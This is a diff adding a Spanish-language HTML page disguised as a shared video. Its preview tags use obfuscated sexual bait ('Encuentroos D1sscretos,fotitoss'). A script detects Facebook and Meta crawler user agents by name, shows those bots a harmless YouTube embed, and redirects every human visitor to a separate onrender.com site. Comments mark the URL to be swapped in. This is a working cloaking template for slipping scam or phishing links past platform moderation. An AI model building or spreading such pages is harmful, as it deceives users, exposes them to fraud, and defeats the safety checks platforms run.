@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Mira este video increíble</title>
+
+ 
+
+    <!-- META TAGS - ESTO ES LO MÁS IMPORTANTE PARA QUE FACEBOOK MUESTRE LA MINIATURA Y TÍTULO -->
+
+    <meta property="og:title" content="Encuentroos D1sscretos,fotitoss">
+
+    <meta property="og:description" content="Encuentroos D1sscretos,fotitoss">
+
+    <meta property="og:image" content="https://i.postimg.cc/zBWGjGcb/Vista-Uno-Sepia.png">
+
+    <meta property="og:image:width" content="1280">
+
+    <meta property="og:image:height" content="720">
+
+    <meta property="og:url" content="https://tupagina.com">
+
+    <meta property="og:type" content="video.other">
+
+    <meta property="og:site_name" content="Mi Sitio">
+
+ 
+
+    <!-- Twitter Card (opcional pero recomendado) -->
+
+    <meta name="twitter:card" content="player">
+
+    <meta name="twitter:title" content="Mira este video increíble 🔥">
+
+    <meta name="twitter:image" content="https://img.youtube.com/vi/TU_VIDEO_ID/maxresdefault.jpg">
+
+ 
+
+    <style>
+
+        body {
+
+            margin: 0;
+
+            padding: 0;
+
+            background: #000;
+
+            color: white;
+
+            font-family: Arial, sans-serif;
+
+            text-align: center;
+
+        }
+
+        .bot-content {
+
+            padding: 40px 20px;
+
+        }
+
+        .thumbnail {
+
+            max-width: 100%;
+
+            height: auto;
+
+            border-radius: 12px;
+
+            margin: 20px auto;
+
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+
+        }
+
+        iframe {
+
+            max-width: 100%;
+
+            border: none;
+
+            border-radius: 12px;
+
+        }
+
+        h1 {
+
+            margin: 15px 0 10px 0;
+
+            font-size: 28px;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+ 
+
+    <!-- Contenido que verán los BOTS de Facebook -->
+
+    <div id="bot-content" class="bot-content">
+
+        <h1>Mira este video increíble 🔥</h1>
+
+        
+
+        <!-- Imagen miniatura grande (la que Facebook usará en la preview) -->
+
+        <img src="https://i.postimg.cc/zBWGjGcb/Vista-Uno-Sepia.png"
+
+             alt="Miniatura del video"
+
+             class="thumbnail">
+
+ 
+
+        <!-- Video de YouTube -->
+
+        <iframe width="900" height="506"
+
+                src="https://www.youtube.com/watch?v=MoY52j3he8k"
+
+                title="Video para bots"
+
+                frameborder="0"
+
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+
+                allowfullscreen>
+
+        </iframe>
+
+        
+
+        <p>Este video se muestra especialmente para Facebook.</p>
+
+    </div>
+
+ 
+
+    <script>
+
+        // Detección de bots de Meta / Facebook 2026
+
+        const ua = navigator.userAgent.toLowerCase();
+
+        const isBot = /facebookexternalhit|facebookbot|facebot|meta-externalagent|meta-webindexer|facebookcatalog/i.test(ua);
+
+ 
+
+        if (isBot) {
+
+            // Mostrar video + miniatura a los bots
+
+            document.getElementById('bot-content').style.display = 'block';
+
+        } else {
+
+            // Redirigir a los humanos a tu página
+
+            window.location.href = "https://nuevaespan25254452.onrender.com";
+
+            // ←←← CAMBIA ESTA URL
+
+        }
+
+    </script>
+
+ 
+
+</body>
+
+</html>
